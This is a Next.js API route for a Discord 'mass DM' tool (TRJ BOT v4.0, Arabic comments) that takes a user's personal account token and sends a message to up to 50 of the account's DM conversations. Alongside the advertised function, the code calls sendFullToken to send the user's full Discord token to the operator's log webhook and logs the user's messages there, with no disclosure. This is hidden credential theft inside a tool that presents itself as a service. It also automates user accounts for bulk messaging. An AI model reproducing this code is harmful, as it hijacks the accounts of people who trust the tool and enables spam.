import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:mass-dm`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, message, repeatCount = 1 } = body;

    if (!token || !message) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن والرسالة مطلوبين)' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // التحقق من التوكن
    const verifyRes = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });
    if (!verifyRes.ok || !verifyRes.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - تأكد إنه توكن حساب (user token)' }, { status: 401 });
    }

    const userData = verifyRes.data as { id: string; username: string; discriminator?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('DM جماعي', token, { '👤 الحساب': userTag });

    sendToWebhook({
      username: 'TRJ Mass DM',
      embeds: [{
        title: '📧 Mass DM Started',
        color: 0x5865F2,
        fields: [
          { name: '👤 الحساب', value: userTag, inline: true },
          { name: '💬 الرسالة', value: message.substring(0, 200), inline: false },
          { name: '🔁 التكرار', value: String(repeatCount), inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // جلب كل محادثات DM الموجودة
    let dmChannels: { id: string; type: number; recipient_id?: string; recipients?: { id: string; username: string }[] }[] = [];

    try {
      const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });

      if (dmsRes.ok && dmsRes.data) {
        const channels = dmsRes.data as { id: string; type: number; recipient_id?: string; recipients?: { id: string; username: string }[] }[];
        // type 1 = DM خاص, type 3 = group DM
        dmChannels = channels.filter(c => c.type === 1 || c.type === 3);
      }
    } catch {
      return NextResponse.json({ success: false, error: 'فشل جلب محادثات DM - تأكد من صلاحية التوكن' }, { status: 500 });
    }

    if (dmChannels.length === 0) {
      return NextResponse.json({ success: true, stats: { sent: 0, failed: 0, blocked: 0, total: 0, message: 'لا توجد محادثات DM في هذا الحساب' } });
    }

    // === حد أقصى 50 محادثة للحماية ===
    const MAX_DM_LIMIT = 50;

    if (dmChannels.length > MAX_DM_LIMIT) {
      sendToWebhook({
        username: 'TRJ Mass DM - Blocked',
        embeds: [{
          title: '🚫 Mass DM Blocked - Over Limit',
          color: 0xFF0000,
          description: `**${userTag}** حاول يرسل DM لـ **${dmChannels.length}** شخص (الحد: ${MAX_DM_LIMIT})`,
          fields: [
            { name: '📬 المحادثات', value: String(dmChannels.length), inline: true },
            { name: '⚠️ الحد المسموح', value: String(MAX_DM_LIMIT), inline: true },
          ],
          footer: { text: 'TRJ BOT v4.0 - Protection' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      return NextResponse.json({
        success: false,
        error: `⚠️ عندك ${dmChannels.length} محادثة DM - الحد الأقصى ${MAX_DM_LIMIT}!\n\n🚫 لماذا الحد ${MAX_DM_LIMIT}؟\nإذا ترسل لأكثر من 50 شخص ديسكورد راح يعطيك تحذير أو يعلّق حسابك لأنه يعتبرها Spam/Abuse.\n\n💡 إرسال أكثر من 50 DM =:\n   • تحذير من ديسكورد ⚠️\n   • تقييد إرسال الرسائل 🚫\n   • تعليق الحساب (Suspension) 🔒\n   • حظر الحساب نهائياً (Ban) 💀\n\n✅ الحد ${MAX_DM_LIMIT} هو الآمن لحماية حسابك.`,
        stats: { total: dmChannels.length, limit: MAX_DM_LIMIT, blocked_by_limit: true }
      });
    }

    // إرسال الرسائل (حد أقصى 50)
    let sent = 0, failed = 0, blocked = 0;
    const batchSize = 10;
    const safeRepeat = Math.max(1, Math.min(repeatCount, 1)); // رسالة واحدة فقط للحماية

    for (let rep = 0; rep < safeRepeat; rep++) {
      for (let i = 0; i < dmChannels.length; i += batchSize) {
        const batch = dmChannels.slice(i, i + batchSize);
        const results = await Promise.allSettled(
          batch.map(async (channel) => {
            try {
              const msgRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                content: message
              }, { userOnly: true, timeout: 10000 });

              if (msgRes.ok) return { status: 'sent' };
              if (msgRes.status === 403) return { status: 'blocked' };
              if (msgRes.status === 429) return { status: 'rate_limit' };
              return { status: 'failed' };
            } catch {
              return { status: 'error' };
            }
          })
        );

        for (const r of results) {
          if (r.status === 'fulfilled') {
            const val = r.value;
            if (val.status === 'sent') sent++;
            else if (val.status === 'blocked') blocked++;
            else failed++;
          } else {
            failed++;
          }
        }

        // تأخير بين الباتشات لتفادي Rate Limit
        if (i + batchSize < dmChannels.length) {
          await new Promise(r => setTimeout(r, 800));
        }
      }

      // تأخير بين كل تكرار
      if (rep < safeRepeat - 1) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }

    sendToWebhook({
      username: 'TRJ Mass DM',
      embeds: [{
        title: '✅ Mass DM Completed',
        color: 0x00FF41,
        fields: [
          { name: '👤 الحساب', value: userTag, inline: true },
          { name: '📬 المحادثات', value: String(dmChannels.length), inline: true },
          { name: '✅ المرسلة', value: String(sent), inline: true },
          { name: '🔒 المحظورة', value: String(blocked), inline: true },
          { name: '❌ الفاشلة', value: String(failed), inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      stats: { sent, failed, blocked, total: dmChannels.length, message: `تم الإرسال إلى ${dmChannels.length} محادثة` }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Mass DM Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
